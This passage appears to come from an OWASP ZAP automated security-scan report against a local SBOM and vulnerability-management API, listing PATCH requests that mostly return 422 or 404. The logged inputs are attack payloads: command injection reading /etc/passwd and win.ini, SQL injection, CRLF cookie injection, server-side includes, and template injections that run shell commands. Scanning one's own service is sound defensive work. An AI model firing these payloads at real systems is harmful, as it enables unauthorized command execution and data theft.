  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe;get-help")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe\" UNION ALL select NULL -- ")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe\"")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe\"&cat /etc/passwd&\"")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe\"&type %SYSTEMROOT%\\win.ini&\"")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe\";cat /etc/passwd;\"")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe\";get-help")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe\"|type %SYSTEMROOT%\\win.ini")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("John Doe|type %SYSTEMROOT%\\win.ini")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("Set-cookie: Tamper=df7ff2ce-a06a-4977-bbe2-e0c0f5631ae1")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("URL='http://6178435829869361747.owasp.org'")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n\n")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("ZAP")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s\n")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("\"")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("\"'")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("\"+response.write(421,160*352,778)+\"")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("\"/><xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=\"")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("\"><!--#EXEC cmd=\"dir \\\"--><")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("\"><!--#EXEC cmd=\"ls /\"--><")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("]]>")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("any?\nSet-cookie: Tamper=df7ff2ce-a06a-4977-bbe2-e0c0f5631ae1")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("any?\r\nSet-cookie: Tamper=df7ff2ce-a06a-4977-bbe2-e0c0f5631ae1")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("any?\r\nSet-cookie: Tamper=df7ff2ce-a06a-4977-bbe2-e0c0f5631ae1\r\n")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("any\nSet-cookie: Tamper=df7ff2ce-a06a-4977-bbe2-e0c0f5631ae1")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("any\r\nSet-cookie: Tamper=df7ff2ce-a06a-4977-bbe2-e0c0f5631ae1")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("any\r\nSet-cookie: Tamper=df7ff2ce-a06a-4977-bbe2-e0c0f5631ae1\r\n")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("awySKGVfkZZdmZkOldQxBAfEymcNxWQDwcCpaNGBvsROLbfGZXMNNdkSNDDWurNvogEMknUCjMOcxTOjMiLJvQEMMWHmTXJNpedYCPpFwHHoiMthMLWcSSRVNUUxDZExcAUCyDSWayxXYrkPhsROwsHeQTkfbViJJwgynbsZoNQSxFirolTtcwXhbCFhPaFHHtOFQDXeTFJQyrWOSDLxlddqNSbZBHvdoeUeDmLLHrBiSkxtXjmTCXOXlohcEdEBEZTfoqSFnZqMYfwDPaFBtvodPoHQhjChDXCPASbDMSMFiedAwWGBiIfHNeCPAPRURlMkYVbiobKseoJWRxyZfXKRdBiJIdmgQTtLVVBETtRqRedxAhxMoYUyrTiQuoPydEYFehhOPgDRrQVhWcSQlKrrnipvPhfOkEmAaQtUYkxORMuNnvUBZCIHKgxOmgAcdBapjHnsvZpLSKdAVTEcLeIIARKCAlbthrDhyPAujlhlwCkdMLCLNKuYsSprKek)`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("cat /etc/passwd")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("get-help")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("http://\\6178435829869361747.owasp.org")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("http://www.google.com")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("http://www.google.com/")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("http://www.google.com/search?q=ZAP")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("http://www.google.com:80/")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("http://www.google.com:80/search?q=ZAP")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("https://6178435829869361747%2eowasp%2eorg")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("https://6178435829869361747.owasp.org")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("https://6178435829869361747.owasp.org/?John Doe")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("https://\\6178435829869361747.owasp.org")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("response.write(421,160*352,778)")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("system-property('xsl:vendor')/>")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("type %SYSTEMROOT%\\win.ini")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("www.google.com")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("www.google.com/")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("www.google.com/search?q=ZAP")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("www.google.com:80/")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("www.google.com:80/search?q=ZAP")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj 1421*6527 zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj#set($x=1547*5606)${x}zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj#{6109*5440}zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj${5244*7038}zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj<%=8517*3655%>zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj<p th:text=\"${9634*2678}\"></p>zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj{#2841*9320}zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj{9890*4687}zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj{@1593*8425}zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj{@math key=\"7866\" method=\"multiply\" operand=\"2685\"/}zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj{{48840|add:13040}}zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj{{5084*8592}}zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj{{=9561*5737}}zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("zj{{print \"2311\" \"2560\"}}zj")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("{system(\"sleep 15\")}")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"sleep 15\")}}")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("{{__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}}")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override ()("{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\\\")\")()}}")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override/
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override/ ()("John Doe")`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10
  * Node Name: `http://host.docker.internal:8000/api/products/10 ()({"name":ZAP,"description":Zaproxy alias impedit expedita quisquam pariatur exercitationem. Nemo rerum eveniet dolores rem quia dignissimos.,"product_key":"John Doe","vendor":"John Doe","category":"John Doe","status":"John Doe","latest_version":"John Doe","metadata_json":{}})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/
  * Node Name: `http://host.docker.internal:8000/api/products/10/ ()({"name":ZAP,"description":Zaproxy alias impedit expedita quisquam pariatur exercitationem. Nemo rerum eveniet dolores rem quia dignissimos.,"product_key":"John Doe","vendor":"John Doe","category":"John Doe","status":"John Doe","latest_version":"John Doe","metadata_json":{}})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/schedule
  * Node Name: `http://host.docker.internal:8000/api/products/10/schedule ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/schedule/
  * Node Name: `http://host.docker.internal:8000/api/products/10/schedule/ ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10
  * Node Name: `http://host.docker.internal:8000/api/projects/10 ()({project_name,project_details,project_status,modified_by})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/schedule
  * Node Name: `http://host.docker.internal:8000/api/projects/10/schedule ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/schedule/
  * Node Name: `http://host.docker.internal:8000/api/projects/10/schedule/ ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id ()({current_content,project_id})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id ()({current_content,project_id})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/ ()({current_content,project_id})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id ()({current_content,project_id})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id ()({current_content,project_id})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/ ()({current_content,project_id})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10
  * Node Name: `http://host.docker.internal:8000/api/sboms/10 ()({"project_id":10,"product_id":10,"name":ZAP,"product_name":"John Doe","product_version":"John Doe","sbom_version":"John Doe","description":Zaproxy alias impedit expedita quisquam pariatur exercitationem. Nemo rerum eveniet dolores rem quia dignissimos.,"change_reason":"John Doe"})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/ ()({"project_id":10,"product_id":10,"name":ZAP,"product_name":"John Doe","product_version":"John Doe","sbom_version":"John Doe","description":Zaproxy alias impedit expedita quisquam pariatur exercitationem. Nemo rerum eveniet dolores rem quia dignissimos.,"change_reason":"John Doe"})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/schedule
